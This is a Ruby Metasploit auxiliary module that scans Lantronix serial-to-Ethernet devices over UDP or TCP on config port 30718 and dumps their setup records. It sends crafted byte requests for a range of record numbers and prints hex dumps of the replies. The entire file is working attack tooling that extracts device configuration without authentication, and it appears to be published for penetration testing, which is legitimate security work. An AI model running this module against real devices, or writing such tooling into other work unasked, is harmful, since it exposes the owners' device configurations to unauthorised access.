##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Lantronix dump of setup records via 77feh',
      'Description' => %q{
          This module dumps of setup records on serial-to-ethernet
        devices via the config port (30718/udp/tcp, enabled by default).
      },
      'Author'      => 'kost',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::CHOST,
        Opt::RPORT(30718),
	OptString.new('IPPROTO', [ true, "What IP protocol to use (tcp/udp)", 'udp' ]),
        OptInt.new('RECSTART', [ true,  'Start from setup record number', 0]),
        OptInt.new('RECEND', [ true,  'Stop on setup record number', 15]),
        OptInt.new('SLEEP', [ true,  'Sleep for how many seconds between requests', 0])
      ], self.class)
  end

  def run_host(ip)
    lsock = nil
    res = nil

    datastore['RECSTART'].upto(datastore['RECEND']) do |recno|
      begin
        vprint_status("#{rhost} - dumping setup record no: #{recno} (#{Rex::Text.to_hex_ascii(recno.to_s)}).")
        if datastore['IPPROTO'] == 'udp' then
          vprint_status("#{rhost} - using UDP for communication.")
          lsock = Rex::Socket::Udp.create( {
            'LocalHost' => datastore['CHOST'] || nil,
            'PeerHost'  => ip,
            'PeerPort'  => datastore['RPORT'],
            'Context'   =>
            {
              'Msf' => framework,
              'MsfExploit' => self
            }
          })
        else
          vprint_status("#{rhost} - using TCP for communication.")
          lsock = connect
        end

        recstr="\x00\x00\x00" + ("e0".to_i(16)+recno).chr
        # vprint_status("#{rhost} - sending #{Rex::Text.to_hex_dump(recstr)}")
        lsock.put(recstr)

        result = lsock.recvfrom(65535, 10) and result[1]
        res = result[0]
        # vprint_status("#{rhost} - got #{Rex::Text.to_hex_dump(res)}")

        if res and res.length > 4 and res[0,3] == "\x00\x00\x00"
          print_good("#{rhost} - got #{Rex::Text.to_hex_dump(res)}")
        else
          print_status("#{rhost} - Unusual response from host")
        end

      rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
        print_error("Connection error")
      rescue ::Interrupt
        raise $!
      rescue ::Exception => e
        print_error("Unknown error: #{e.class} #{e}")
      ensure
        lsock.close if lsock
      end
      vprint_status("#{rhost} - Sleeping for #{datastore['SLEEP']}")
      sleep datastore["SLEEP"]
    end
  end

end
